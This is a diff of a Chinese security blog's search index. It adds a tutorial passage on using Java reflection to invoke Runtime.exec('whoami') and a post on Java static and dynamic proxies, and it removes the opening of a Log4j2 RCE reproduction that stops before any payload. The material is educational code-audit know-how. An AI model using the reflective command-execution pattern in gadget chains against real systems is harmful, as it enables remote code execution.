class="string">&quot;whoami&quot;</span>).getInputStream(),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>反射Demo1:(注:记得添加org.apache.commons.io程序包)</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zhixing</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;    <span class="comment">//System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;UTF-8&quot;));</span></span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">            Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">            String cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">            Object runtimeInstance = constructor.newInstance();</span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">            Method runtimeMethod = runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">            Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">            InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果:</p>
+<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211207185314924.png" class title="image-20211207185314924">
+
+<p>返回当前用户为:”desktop-3n366og\administrator”。</p>
+<p>反射 Demo2:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;UTF-8&quot;));</span></span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">        Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">        Object runtime = runtimeClass1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(runtimeClass1);</span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">        Process process = (Process) runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(runtime,cmd);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">        InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">        System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这两个代码都是反射调用Runtime类的exec()方法执行本地命令执行。但两者不同的是，Demo1获取Runtime类对象是通过构造器创建构造方法来获取，而Demo2是通过Runtime类的getRuntime()方法来获取。</p>
+<h3 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h3><p>反射调用Runtime实现本地命令执行的流程如下:</p>
+<ul>
+<li>反射获取<code>Runtime</code>类对象(如<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)</li>
+<li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)</li>
+<li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)</li>
+<li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)</li>
+</ul>
 ]]></content>
       <categories>
         <category>代码审计</category>
@@ -278,7 +467,187 @@
         <category>基础知识</category>
       </categories>
       <tags>
-        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
+        <tag>-Java基础 -java反射 -代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java动态代理</title>
+    <url>/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>动态代理在Java中有着广泛的应用，比如Spring AOP、Hibernate数据查询、测试框架的后端mock、RPC远程调用、Java注解对象获取、日志、用户鉴权、全局性异常处理、性能监控，甚至事务处理等</p>
+<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p>创建一个代理对对象进行包装，用该代理对象取代原对象。后续操作中，任何对原对象的调用都要先通过代理对象。代理对象决定是否将方法调用转到原对象上。</p>
+<p>代理模式是一种结构型设计模式，代理模式角色分为 3 种:</p>
+<p><strong>Subject（抽象主题角色）</strong>：定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法；</p>
+<p><strong>RealSubject（真实主题角色</strong>）：真正实现业务逻辑的类；</p>
+<p><strong>Proxy（代理主题角色）</strong>：用来代理和封装真实主题；</p>
+<p>代理模式的结构比较简单，其核心是代理类，为了让客户端能够<strong>一致性地对待</strong>真实对象和代理对象，在代理模式中引入了抽象层.</p>
+<p>代理模式<strong>按照职责</strong>（使用场景）来分类，至少可以分为以下几类：</p>
+<p>1、远程代理  </p>
+<p>2、虚拟代理 </p>
+<p> 3、Copy-on-Write 代理   </p>
+<p>4、保护（Protect or Access）代理  </p>
+<p>5、Cache代理 </p>
+<p> 6、防火墙（Firewall）代理  </p>
+<p>7、同步化（Synchronization）代理 </p>
+<p> 8、智能引用（Smart Reference）代理等等。</p>
+<p>如果<strong>根据字节码的创建时机</strong>来分类，可以分为静态代理和动态代理：</p>
+<ul>
+<li>所谓<strong>静态</strong>也就是在<strong>程序运行前</strong>就已经存在代理类的<strong>字节码文件</strong>，代理类和真实主题角色的关系在运行前就确定了。</li>
+<li>而动态代理的源码是在程序运行期间由<strong>JVM</strong>根据反射等机制<strong>动态的生成</strong>，所以在运行前并不存在代理类的字节码文件。</li>
+</ul>
+<h2 id="代理模式优势"><a href="#代理模式优势" class="headerlink" title="代理模式优势"></a>代理模式优势</h2><p>代理模式能够赋予我们控制访问某个类的能力，在某些情况下，代理可以允许我们屏蔽或控制某个对象的逻辑。在此基础上，引申出来的作用，也是目前开发中最常使用的作用：<code>在不修改原对象代码的基础上，对原对象的功能进行修改或者增强</code>。</p>
+<h3 id="解耦"><a href="#解耦" class="headerlink" title="解耦"></a>解耦</h3><p>降低耦合度甚至解除耦合</p>
+<p><strong>耦合</strong></p>
+<p>当项目中的各个模块或者各个组件，当一个发生变动或者调用的时候，其他一些模块或组件也会产生变化或者调用，类似于齿轮的运转。</p>
+<p><strong>耦合的问题</strong></p>
+<p>当模块或组件耦合度过高时，会带来难以扩展、维护性差、纠错困难等问题，所以在设计时，要尽可能避免模块或组件之间的耦合度过高。</p>
+<p>当我们想要给某个对象添加有些额外逻辑时，就可以使用代理模式，在不修改原代码的前提下，只针对额外功能进行编码。在整个过程中，原对象的逻辑和额外逻辑完全解耦，互不干扰。</p>
+<h3 id="高扩展"><a href="#高扩展" class="headerlink" title="高扩展"></a>高扩展</h3><p>由于模块之间的解耦性，我们可以随时添加任意的功能或者修改之前的功能而不影响原模块的正常执行。</p>
+<h2 id="JAVA代理模式"><a href="#JAVA代理模式" class="headerlink" title="JAVA代理模式"></a>JAVA代理模式</h2><p>Java中有三种方式来创建代理对象：</p>
+<ul>
+<li>静态代理</li>
+<li>基于JDK(接口)的动态代理</li>
+<li>基于CGLIB(Jar包)的动态代理</li>
+</ul>
+<h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><hr>
+<p>手写代理类的代码，工程中有代理类的源码，代理类会编译执行。实现目标类的接口或者直接继承目标类，完成逻辑的修改和增强。</p>
+<h4 id="接口实现方式"><a href="#接口实现方式" class="headerlink" title="接口实现方式"></a>接口实现方式</h4><img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208183027419.png" class title="image-20220208183027419">
+
+<p>目标类:  程序猿(Developer) </p>
+<p>代理类:   Java程序猿(JavaDeveloper)  FullStack程序猿(FullStackDeveloper)</p>
+<p>程序猿(Develpoer.java)</p>
+<p>定义一个程序员的接口，只干两件事情（程序员太忙，别的做不了）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">coded</span><span class="params">()</span></span>;<span class="comment">//会写代码</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>;<span class="comment">//会调试程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>java程序猿会开发和调试java代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDeveloper</span> <span class="keyword">implements</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JavaDeveloper</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">pubic <span class="keyword">void</span> <span class="title">code</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name+<span class="string">&quot;is  codding JavaDeveloper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name+<span class="string">&quot;is debugging JavaDeveloper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后有个FullStack程序猿，在开发之前都会祈祷一下，这样他的代码就不会有bug，也不需要调试。</p>
+<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208180230522.png" class title="image-20220208180230522">
+
+<p>全栈程序猿(FullStackDeveloper.java)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class FullStackDeveloper implements Developer &#123;</span><br><span class="line">   private Developer developer;</span><br><span class="line">   public FullStackDeveloper(Developer developer)</span><br><span class="line">   &#123;</span><br><span class="line">       this.developer = developer;</span><br><span class="line">   &#125;</span><br><span class="line">   public void code()</span><br><span class="line">   &#123;</span><br><span class="line">       System.out.println(&quot;FullStackDeveloper is praying for the code!&quot;);</span><br><span class="line">       this.developer.code();</span><br><span class="line">    &#125;</span><br><span class="line">    public void debug()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;FullStackDeveloper&#x27;s  code is bug-free and does not require dedbugging&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>主函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Developer str = new JavaDeveloper(&quot;YZT&quot;);</span><br><span class="line">        Developer developer = new FullStackDeveloper(str);</span><br><span class="line">        developer.code();</span><br><span class="line">        developer.debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果:</p>
+<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208182141430.png" class title="image-20220208182141430">
+
+<p>如果YZT只是一个普通的Java程序猿，则开发结果是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YZT is  codding JavaDeveloper!</span><br><span class="line"></span><br><span class="line">YZT is  debugging  JavaDeveloper!</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但YZT是个全栈程序猿是这样的:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YZT is  praying for the code!</span><br><span class="line">YZT is  codding JavaDeveloper!</span><br><span class="line">YZT&#x27;code is bug-free and does not require dedbugging!</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="继承方式"><a href="#继承方式" class="headerlink" title="继承方式"></a>继承方式</h4><img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208183204722.png" class title="image-20220208183204722">
+
+<p><strong>示例</strong></p>
+<p>目标类:  程序猿(Developer) </p>
+<p>代理类:   Java程序猿(JavaDeveloper)</p>
+<p>程序猿类(Developer)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Developer &#123;</span><br><span class="line">    public String  code(String str)</span><br><span class="line">    &#123;</span><br><span class="line">     return str+&quot; is coding Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public String  debug(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        return str+&quot; is a debugging Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Java程序猿(javaDeveloper)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JavaDeveloper extends Developer &#123;</span><br><span class="line">    public String code(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        String str1 = super.code(str);</span><br><span class="line">        String str2 = super.debug(str);</span><br><span class="line">        System.out.println(&quot;Wish you have a good Luck!&quot;);</span><br><span class="line">        return str1 +str2+ &quot; He will become a good Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>主程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Developer developer = new JavaDeveloper();</span><br><span class="line">        System.out.println(developer.code(&quot;YZT&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果:</p>
+<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208190213980.png" class title="image-20220208190213980">
+
+
+
+<h4 id="存在问题"><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h4><p>静态代理虽然能实现代理模式，完成解耦，但是静态代理类的代码维护依然非常复杂，一旦接口或者父类发生了变动，则代理类的代码就得随之修改，代理类多的时候维护十分麻烦。</p>
+<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>在内存中生成代理对象的技术。整个代理过程在内存中进行，不需要手动写代理类的代码，也不存在代理类的编译过程，而是直接在Java运行期，凭空在JVM中生成一个代理类对象，供我们使用。</p>
+<h4 id="基于JDK的动态代理"><a href="#基于JDK的动态代理" class="headerlink" title="基于JDK的动态代理"></a>基于JDK的动态代理</h4><p>JDK自带的动态代理技术，需要使用静态方法来创建代理对象，要求目标类必须实现接口。</p>
+<p><strong>Developer.java</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Developer &#123;</span><br><span class="line">        void code();//会写代码</span><br><span class="line">        void debug();//会调试程序</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>GoodDeveloper.java</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GoodDeveloper implements Developer &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    public  GoodDeveloper(String name)</span><br><span class="line">    &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void code() &#123;</span><br><span class="line">        System.out.println(this.name+&quot; is coding Gooddeveloper!!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public void debug() &#123;</span><br><span class="line">        System.out.println(this.name+&quot; is debugging Gooddeveloper!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>ProxyTest.java</strong></p>
+<p>动态代理的例子采用了lambda表达式，主要代码是对InvocationHandler的实现。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class ProxyTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Throwable &#123;</span><br><span class="line">        Developer developer = new GoodDeveloper(&quot;YZT&quot;);</span><br><span class="line">        //新建Developer类型，GoodDeveloper对象</span><br><span class="line">        Developer developerproxy = (Developer) Proxy.newProxyInstance(developer.getClass().getClassLoader(),developer.getClass().getInterfaces(),(proxy, method, args1) -&gt;&#123;</span><br><span class="line">            if(method.getName().equals(&quot;code&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(&quot;YZT is praying for the code!!!&quot;);</span><br><span class="line">                return method.invoke(developer,args1);</span><br><span class="line"></span><br><span class="line">            &#125; else if (method.getName().equals(&quot;debug&quot;)) &#123;</span><br><span class="line">                System.out.println(&quot;YZT&#x27;s code is bug-free and does not require debugging!!!&quot;);</span><br><span class="line">                return method.invoke(developer,args1);</span><br><span class="line">            &#125;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;);</span><br><span class="line">        //labmba匿名函数，新建Developer类型接口，定义方法体输入结果对code()和debug()函数进行动态设置</span><br><span class="line">        developerproxy.code();</span><br><span class="line">        developerproxy.debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果:</p>
+<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210103459006.png" class title="image-20220210103459006">
+
+
+
+<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>developerproxy的类型是Developer接口，而不是一个实现类。developer是基于Developer接口和GoodDeveloper的实现类加载代理出来的对象，并不属于任何一个实现类。</p>
+<p>我们来看下<strong>ProxyTest.java</strong>中的newProxyInstance()接口:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.Proxy @NotNull </span><br><span class="line">public static Object newProxyInstance(ClassLoader loader,@NotNull Class&lt;?&gt;[] interfaces,             @NotNull reflect.InvocationHandler h)</span><br><span class="line">throws IllegalArgumentException</span><br></pre></td></tr></table></figure>
+
+<p>接口中包括三个参数:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader loader：固定写法，执行目标类对象的类加载器即可，用于加载目标类及其接口的代码</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;[] interfaces：固定写法，指定目标类对象的所有接口的Class对象的数组，通常使用目标类的Class对象调用getInterfaces()即可得到</span><br><span class="line"></span><br><span class="line">InvocationHandler h：这个参数是一个接口，主要关注它里面唯一一个方法，invoke方法。它会在代理对象调用方法时执行。也就是说，在代理类对象中调用任何方法，都会执行到invoke()方法。所以在该方法中完成对增强或扩展代码逻辑</span><br></pre></td></tr></table></figure>
+
+<p>loader和interfaces决定这个类到底是个怎么样的类。而h是InvocationHandler，决定这个代理类到底是多了什么功能。所以动态代理的内容重点就是这个InvocationHandler。</p>
+<h4 id="基于CGLIB-父类-的动态代理"><a href="#基于CGLIB-父类-的动态代理" class="headerlink" title="基于CGLIB(父类)的动态代理"></a>基于CGLIB(父类)的动态代理</h4><p>该方式是通过一个静态方法来创建代理对象，不要求目标类实现接口，但是对于目标类不能使用final进行修饰变量，基于目标类生成一个子类作为代理类，所以必须被继承。</p>
+<p>首先在pom.xml文件中添加CGLIB依赖并下载 相关依赖文件资源。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;cglib&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;cglib&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.3.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Cglibtest.java</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ublic class Cglibtest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建一个目标类对象，也就是顾客对象</span><br><span class="line">        Developer developer = new Developer(&quot;YZT&quot;);</span><br><span class="line">        // 使用CGLIB创建代理类对象</span><br><span class="line">        Developer proxy = (Developer) Enhancer.create(developer.getClass(), new MethodInterceptor() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object intercept(Object proxy, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable &#123;</span><br><span class="line">                if(&quot;code&quot;.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(&quot;YZT is praying for the code!!!&quot;);</span><br><span class="line">                    return method.invoke(developer, args);</span><br><span class="line">                &#125;else if (&quot;debug&quot;.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(&quot;YZT&#x27;s code is bug-free and does not require debugging!!!&quot;);</span><br><span class="line">                    return method.invoke(developer, args);</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        proxy.code();</span><br><span class="line">        proxy.debug();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Enhancer.create(Class type, Callback callback)</span><br></pre></td></tr></table></figure>
+
+<p>参数列表</p>
+<p><strong>Class type</strong>：指定目标类Class对象，也就是目标类类型</p>
+<p><strong>Callback callback</strong>：Callback是一个接口，该接口只是一个名称定义接口，并不包含方法的声明，所以使用时通常使用它的一个子接口<code>MethodInterceptor</code>，<code>MethodInterceptor</code>接口中只有一个方法：<code>intercept</code>。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">intercept</span><span class="params">(Object proxy, Method method, Object[] objects, MethodProxy methodProxy)</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>proxy</strong>：代理类对象</p>
+<p><strong>method</strong>：对应的是出发intercept执行的方法的Method对象</p>
+<p><strong>args</strong>：代理对象调用方法时，传递的实际参数</p>
+<p>前三个参数与基于JDK的参数一致</p>
+<p><strong>methodProxy</strong>：方法的代理对象，一般也不作处理，可以暂时忽略</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Proxy角色在执行代理业务的时候，无非是在调用真正业务之前或者之后做一些“额外”业务。 </p>
+<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210111635827.png" class title="image-20220210111635827">
+
+<p>代理类处理的逻辑很简单，在调用某个方法前及方法后做一些额外的业务。换一种思路就是，在触发（invoke）真实角色的方法之前或者之后做一些额外的业务。为了构造出具有通用、简单的代理类，可以将所有的触发真实角色动作交给一个触发的管理器。这种管理器就是InvocationHandler。</p>
+<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210111716233.png" class title="image-20220210111716233">
+
+
+
+<p>在这种模式之中，代理Proxy和RealSubject需要实现相同的功能（函数方法）。</p>
+<p>面向对象的编程之中，想要约定Proxy和RealSubject实现相同的功能（函数方法）有两种方式</p>
+<p>a、定义一个功能接口，Proxy 和RealSubject都实现这个接口。</p>
+<p>b、通过继承，Proxy继承自RealSubject，这样Proxy则拥有了RealSubject的功能，</p>
+<p>JDK中提供的创建动态代理的机制采用a思路；而cglib采用b思路（spring两者都使用了）。 </p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>java</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>-代码审计 -JAVA基础</tag>
       </tags>
   </entry>
   <entry>
@@ -504,375 +873,6 @@
       </categories>
       <tags>
         <tag>-JWT - 认证方式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache Log4j2 RCE漏洞复现</title>
-    <url>/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
-<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
-<p>pom.xml文件如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>点击下载相应程序包资源</p>
-<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
-<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
